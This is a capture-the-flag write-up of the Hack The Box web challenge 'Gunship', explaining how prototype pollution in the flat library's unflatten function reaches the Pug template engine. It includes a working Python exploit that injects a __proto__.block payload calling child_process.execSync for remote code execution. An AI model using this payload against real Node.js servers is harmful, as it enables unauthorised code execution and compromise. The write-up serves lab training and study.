# Gunship

![Gunship](/ctf/hack-the-box/challenges/web/gunship/gunship.gif)

## Challenge Description

In this challenge, we were tasked with exploiting a web application named Gunship. The application is a Single Page
Application (SPA), and at the bottom of the page, there is a form where users can submit their favorite artist's name.

We were also provided with the source code of the application, which revealed potential vulnerabilities that could be
leveraged to compromise the system.

![Gunship](/ctf/hack-the-box/challenges/web/gunship/gunship-home.png)

## Code Review

### Key Dependencies

By reviewing the package.json file, we identified that the application uses several Node.js libraries, including:

```json
{
    "dependencies": {
        "express": "^4.17.1",
        "flat": "5.0.0",
        "pug": "^3.0.0"
    }
}
```

::: info Notably:

- Pug (version 3.0.0) is used to render server responses and is known to be vulnerable to prototype pollution.
- Flat (version 5.0.0), a library that converts nested objects into flat key/value pairs and vice versa, is used in the
  request handling process. The unflatten function from this library also has potential weaknesses that allow for
  prototype pollution.
  :::

### Endpoint Analysis

The form submits user input via a POST request to the /api/submit endpoint. The vulnerable portion of the server-side
code can be seen below:

```javascript
const { unflatten } = require("flat");

router.post("/api/submit", (req, res) => {
    const { artist } = unflatten(req.body);

    if (artist.name.includes("Haigh") || artist.name.includes("Westaway") || artist.name.includes("Gingell")) {
        return res.json({
            "response": pug.compile("span Hello #{user}, thank you for letting us know!")({ user: "guest" }),
        });
    } else {
        return res.json({
            "response": "Please provide us with the full name of an existing member.",
        });
    }
});
```

- Pug is used to render the response based on user input.
- The unflatten function processes the request body. However, it is vulnerable to prototype pollution, allowing us to
  manipulate the object prototype.

## Exploitation - Prototype Pollution

### Vulnerability: Prototype Pollution

By exploiting the prototype pollution vulnerability in flat’s unflatten function, we can inject arbitrary properties
into the `artist` object’s prototype. This can lead to remote code execution (RCE) through the Pug templating engine.

### Exploit Strategy

We will use Python to craft and send a malicious payload to the vulnerable `/api/submit` endpoint, injecting a `block`
object into the prototype of the `artist` object. This injected object will execute system commands on the server.

### Exploit Code:

```python
import requests

url = "http://localhost:1337/api/submit"

payload = {
    "artist.name": "Haigh",
    "__proto__.block": {
        "type": "Text", 
        "line": "process.mainModule.require('child_process').execSync('$(cat flag*)')"
    }
}

r = requests.post(url, json=payload)
print(r.json())
```

### Explanation of the Payload:

- **Prototype Injection**: The payload injects the `block` object into the prototype of the `artist` object using the
  `__proto__` property.
- **Command Execution**: The `block.line` property is set to execute a command using **Node.js** to read a file that
  starts
  with `flag` (`cat flag*`), typically containing the challenge flag.
- **Why `$()`?**: The `$()` syntax ensures that the command (`cat flag*`) is evaluated and executed by the system.

### Result:

After sending the crafted payload, the server returns the following response:

```
HTB{f4k3_fl4g_f0r_t3st1ng}
```

We got the flag!
Now you can try this on the HTB server to get the real flag.

![Gunship](/ctf/hack-the-box/challenges/web/gunship/gunship-pwned.png)

## References

- [Github - pug - Code Injection](https://github.com/pugjs/pug/issues/3312)
- [Hacktricks - Pug Prototype Pollution](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#pug-vulnerability)